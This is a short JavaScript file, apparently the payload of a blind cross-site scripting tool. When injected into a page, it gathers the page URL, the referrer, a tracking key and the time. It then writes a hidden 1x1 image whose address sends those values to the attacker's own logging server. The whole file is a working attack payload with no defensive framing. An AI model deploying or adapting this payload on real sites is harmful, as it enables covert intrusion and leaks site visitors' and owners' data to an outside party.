

var pid = document.getElementById('hbxss');
var domain = pid.src.split("/payload.js");
domain = domain[0];

var key = pid.className;
var url = document.location.href;
var referer = document.referrer;
var now = new Date();
var ip = "";

document.write("<img/src="+domain+"/logs/new?key="+key+"&url="+url+"&referer="+referer+"&ip="+ip+"&time="+now.toTimeString()+" style='width:1px;height:1px;'>");





